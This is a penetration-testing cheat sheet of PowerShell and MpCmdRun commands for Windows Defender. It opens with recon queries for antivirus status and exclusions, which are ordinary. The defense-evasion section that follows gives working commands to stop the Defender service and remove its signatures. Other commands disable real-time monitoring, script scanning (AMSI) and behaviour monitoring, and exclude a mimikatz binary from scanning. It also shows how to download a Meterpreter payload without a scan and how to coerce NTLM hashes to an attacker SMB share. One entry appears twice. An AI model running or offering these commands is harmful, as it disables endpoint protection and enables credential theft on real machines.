# pwsh
% windows, security, antivirus, defender

#plateform/windows #target/local #cat/RECON/SECURITY/DEFENDER #tag/powershell 



## defender - knowledge
```powershell
https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1
https://wirediver.com/disable-windows-defender-in-powershell/
```


## defender - get antivirus
```powershell
wmic.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

## defender - get powershell commands
```powershell
Get-Command -Module Defender
```

## defender - get service Status
```powershell
(Get-Service windefend).Status
```

## defender - get status
```powershell
Get-MpComputerStatus
```

## defender - get defensive modules status
```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled, Antispyware | FL
```

## defender - get tamper protection status
```powershell
Get-MpComputerStatus | Select IsTamperProtected, RealTimeProtectionEnabled | FL
```

## defender - get exclusions path
```powershell
Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionExtension
```

## defender - get exclusions extension
```powershell
Get-MpPreference | Select-Object  -Property ExclusionExtension
```


#cat/DEFENSE-EVASION/SECURITY/DEFENDER

## Defender - stop service
```powershell
sc.exe config WinDefend start= disabled; (Get-Service windefend).stop
```

## Defender - Remove signatures (if Internet connection is present, they will be downloaded again)
%ProgramFiles%\Windows Defender\MpCmdRun.exe
```powershell
.\MpCmdRun.exe -RemoveDefinitions -All
```

## Defender - disable All
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true;  Set-MpPreference -DisableScriptScanning $true
```

## Defender - disable Real Time Monitoring 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Defender - Disable scanning for downloaded or attachments
```powershell
Set-MpPreference -DisableIOAVProtection $true
```

## Defender - Disable behaviour monitoring
```powershell
Set-MPPreference -DisableBehaviourMonitoring $true
```

## Defender - Disable AMSI
```powershell
Set-MpPreference -DisableScriptScanning $true
```


## Defender - Add path to exclusions
```powershell
$p = "<path|c:\windows\temp>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
```


## Defender - Add process to exclusions (1)
```powershell
$p = "<path|c:\windows\temp\mimikatz.exe>" ; Add-MpPreference -ExclusionProcess $p -AttackSurfaceReductionOnlyExclusions $p
```

## Defender - Add process to exclusions (2)
```powershell
$p = "<binary|mimikatz.exe>" ; Add-MpPreference -ExclusionProcess $p -AttackSurfaceReductionOnlyExclusions $p
```

## Defender - Add extension to exclusions
```powershell
Set-MpPreference -ExclusionExtension "<extension|ps1>"
```

## Defender - Download without triggering scan
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
```

## Defender - steal net-tnlm
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
```


## Defender - steal net-tnlm
```powershell
C:\Program Files\Windows Defender\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
```

## Defender - remove signatures
```powershell
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe -RemoveDefinitions -All
```